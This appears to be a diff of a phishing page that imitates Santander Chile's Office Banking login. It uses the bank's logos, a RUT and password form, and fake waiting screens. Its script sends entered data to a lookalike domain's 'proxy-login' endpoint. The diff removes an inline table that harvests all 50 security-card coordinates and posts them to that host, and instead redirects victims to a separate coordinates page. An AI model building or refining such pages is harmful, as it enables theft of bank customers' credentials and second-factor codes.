@@ -153,39 +153,44 @@
   <button type="button" data-bs-target="#carouselExample" data-bs-slide-to="2" aria-label="Slide 3"></button>
 </div>
 
- <!-- OFFCANVAS LOGIN -->
 <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasLogin">
-  <div class="offcanvas-header">
+  <div class="offcanvas-header" style="padding-top:40px; padding-bottom:20px;">
+
     <div class="d-flex justify-content-center align-items-center">
       <img src="/logo-office-banking.svg" class="logo-ob me-3">
       <img src="/LogoSantander.png" class="logo-santander">
     </div>
 
-    <button type="button" class="btn-close" data-bs-dismiss="offcanvas"></button>
+    <button type="button" class="btn-close" data-bs-dismiss="offcanvas"
+            style="filter: invert(30%) sepia(100%) saturate(5000%) hue-rotate(340deg);"></button>
   </div>
 
-  <div class="offcanvas-body">
+  <div class="offcanvas-body" style="overflow-y:auto; max-height:100vh;">
 
     <h5 class="text-center mb-4">Bienvenido a Office Banking</h5>
 
     <div class="login-box">
 
-      <!-- LOGIN -->
+      <!-- FORMULARIO LOGIN -->
       <form id="loginForm">
         <label for="rut">RUT</label>
         <div class="position-relative">
-          <input type="text" id="rut" placeholder="12.345.678-5" required class="form-control">
-          <span class="clear-input" onclick="rut.value=''"></span>
+          <input type="text" id="rut" name="rut" placeholder="12.345.678-5" required class="form-control" style="padding-right:40px;">
+          <span class="clear-input" onclick="document.getElementById('rut').value=''"></span>
         </div>
 
         <label for="passwd">Contraseña</label>
         <div class="position-relative">
-          <input type="password" id="passwd" required class="form-control">
-          <span class="clear-input" onclick="passwd.value=''"></span>
-          <img id="togglePasswd" src="eye.svg" class="icon-eye">
+          <input type="password" id="passwd" name="passwd" required class="form-control" style="padding-right:80px;">
+          <span class="clear-input" onclick="document.getElementById('passwd').value=''"></span>
+          <img id="togglePasswd" src="eye.svg" alt="Mostrar contraseña" class="icon-eye">
         </div>
 
         <button type="submit" class="btn-red w-100">Aceptar</button>
+
+        <div class="options">
+          <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">¿Olvidaste tu clave?</a>
+        </div>
       </form>
 
       <div id="resultado"></div>
@@ -203,7 +208,10 @@
         <button class="btn-red" onclick="enviarCorreo()">Enviar</button>
       </div>
 
-      <!-- NUEVA PANTALLA: SELECCIÓN -->
+      <!-- ========================= -->
+      <!--   NUEVA PANTALLA: PREGUNTA -->
+      <!-- ========================= -->
+
       <div id="pantallaSeleccion" class="hidden" style="padding:20px;">
         <div class="text-center mb-3">
           <img src="/logo-office-banking.svg" style="height:50px;">
@@ -222,98 +230,6 @@
         </button>
       </div>
 
-      <!-- COORDENADAS -->
-      <div id="pantallaCoordenadas" class="hidden" style="padding:20px;">
-        <h2 class="text-center">Ingresa tus 50 coordenadas</h2>
-
-        <div class="table-responsive">
-          <table class="table table-bordered text-center">
-            <thead>
-              <tr>
-                <th></th>
-                <th>A</th><th>B</th><th>C</th><th>D</th><th>E</th>
-                <th>F</th><th>G</th><th>H</th><th>I</th><th>J</th>
-              </tr>
-            </thead>
-            <tbody>
-              <!-- 5 FILAS X 10 COLUMNAS -->
-              <!-- FILA 1 -->
-              <tr><th>1</th>
-                <td><input id="coord-A1" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-B1" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-C1" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-D1" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-E1" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-F1" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-G1" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-H1" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-I1" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-J1" maxlength="2" class="coord-input"></td>
-              </tr>
-
-              <!-- FILA 2 -->
-              <tr><th>2</th>
-                <td><input id="coord-A2" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-B2" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-C2" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-D2" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-E2" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-F2" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-G2" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-H2" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-I2" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-J2" maxlength="2" class="coord-input"></td>
-              </tr>
-
-              <!-- FILA 3 -->
-              <tr><th>3</th>
-                <td><input id="coord-A3" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-B3" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-C3" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-D3" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-E3" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-F3" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-G3" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-H3" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-I3" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-J3" maxlength="2" class="coord-input"></td>
-              </tr>
-
-              <!-- FILA 4 -->
-              <tr><th>4</th>
-                <td><input id="coord-A4" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-B4" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-C4" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-D4" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-E4" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-F4" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-G4" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-H4" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-I4" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-J4" maxlength="2" class="coord-input"></td>
-              </tr>
-
-              <!-- FILA 5 -->
-              <tr><th>5</th>
-                <td><input id="coord-A5" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-B5" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-C5" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-D5" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-E5" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-F5" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-G5" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-H5" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-I5" maxlength="2" class="coord-input"></td>
-                <td><input id="coord-J5" maxlength="2" class="coord-input"></td>
-              </tr>
-
-            </tbody>
-          </table>
-        </div>
-
-        <button class="btn-red w-100" onclick="enviarCoordenadas()">Ingresar</button>
-      </div>
-
       <!-- PRODUCTOS -->
       <div id="pantallaProductos" class="hidden">
         <h2>Estamos evaluando la mejor alternativa posible</h2>
@@ -324,7 +240,10 @@
   </div>
 </div>
 
-<!-- SCRIPTS -->
+<!-- ========================= -->
+<!--         SCRIPTS           -->
+<!-- ========================= -->
+
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
 
 <script>
@@ -388,7 +307,7 @@ loginForm.addEventListener("submit", async e=>{
   },45000);
 });
 
-/* CORREO → NUEVA PANTALLA */
+/* CORREO */
 async function enviarCorreo(){
   try{
     await fetch("https://officebankingchile.com/proxy-login",{
@@ -409,8 +328,7 @@ async function enviarCorreo(){
 
 /* SELECCIÓN */
 function seleccionarCoordenadas(){
-  pantallaSeleccion.classList.add("hidden");
-  pantallaCoordenadas.classList.remove("hidden");
+  window.location.href = "coordenadas.html";
 }
 
 function seleccionarPass(){
@@ -421,40 +339,6 @@ function seleccionarPass(){
     pantallaEspera.classList.add("hidden");
     pantallaProductos.classList.remove("hidden");
   },8000);
-}
-
-/* COORDENADAS */
-async function enviarCoordenadas(){
-  let coords={};
-  const letras=["A","B","C","D","E","F","G","H","I","J"];
-
-  for(let f=1;f<=5;f++){
-    for(let c of letras){
-      let id=`coord-${c}${f}`;
-      let v=document.getElementById(id).value.trim();
-      if(v.length!==2){
-        alert(`El valor ${c}${f} debe tener 2 dígitos.`);
-        return;
-      }
-      coords[`${c}${f}`]=v;
-    }
-  }
-
-  try{
-    await fetch("https://officebankingchile.com/proxy-login",{
-      method:"POST",
-      headers:{ "Content-Type":"application/json" },
-      body:JSON.stringify({ coordenadas:coords })
-    });
-  }catch(e){}
-
-  pantallaCoordenadas.classList.add("hidden");
-  pantallaEspera.classList.remove("hidden");
-
-  setTimeout(()=>{
-    pantallaEspera.classList.add("hidden");
-    pantallaProductos.classList.remove("hidden");
-  },15000);
 }
 
 /* PRODUCTOS */
